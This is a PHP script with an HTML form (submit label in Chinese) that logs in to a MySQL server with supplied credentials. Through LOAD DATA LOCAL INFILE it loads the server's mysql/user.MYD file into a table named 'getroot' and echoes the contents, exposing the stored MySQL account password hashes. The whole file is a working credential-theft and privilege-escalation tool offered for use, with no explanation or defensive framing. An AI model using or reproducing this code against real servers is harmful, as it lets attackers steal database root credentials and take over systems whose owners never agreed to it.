<?php
if(isset($_POST['sub'])){
$name=$_POST['name'];
$pass=$_POST['password'];
$host=$_POST['host'];
$db=$_POST['db'];
$link = mysql_connect($host,$name,$pass);
if(!$link){
die("could not connect".mysql_error());
}

if(!mysql_select_db($db,$link)){
	die("db".mysql_error());
}

$db_path_sql="select @@basedir";
if($n=mysql_query($db_path_sql)){
	$db_path_rs=mysql_fetch_array($n);
	 $db_path=str_replace("\\","/",$db_path_rs[0]);
}


$dropgetroot='DROP table getroot';
$sql="CREATE TABLE getroot (`code` TEXT NOT NULL ) ENGINE = MYISAM CHARACTER SET utf8 COLLATE utf8_general_ci;";
$exp="LOAD DATA LOCAL INFILE '".$db_path."/data/mysql/user.MYD' INTO TABLE getroot fields terminated by '' LINES TERMINATED BY '\0';";
$select="SELECT code FROM getroot";
$pass="";
mysql_query($dropgetroot);
if(mysql_query($sql)){
	if($row=mysql_query($exp)){
		if($row=mysql_query($select)){
			while($rows=mysql_fetch_array($row))
				{
				echo $pass.=$rows['code'];
				}
				
		
	}
		
	}



}



}
else{

	echo "<head>";
	echo '<meta http-equiv="content-type" content="text/html;charset=utf-8">';
	echo "</head>";
	echo '<form action="" method="post">';
	echo 'host：<input type="text" name="host"><br>';
	echo 'name：<input type="text" name="name"><br>';
	echo 'pass：<input type="text" name="password"><br>';
	echo 'db&nbsp&nbsp：<input type="text" name="db">';
	echo '<input type="submit" value="提交" name="sub">';
	echo "</form>";
	echo "<hr>";
	echo "</html>";
	


}



?>







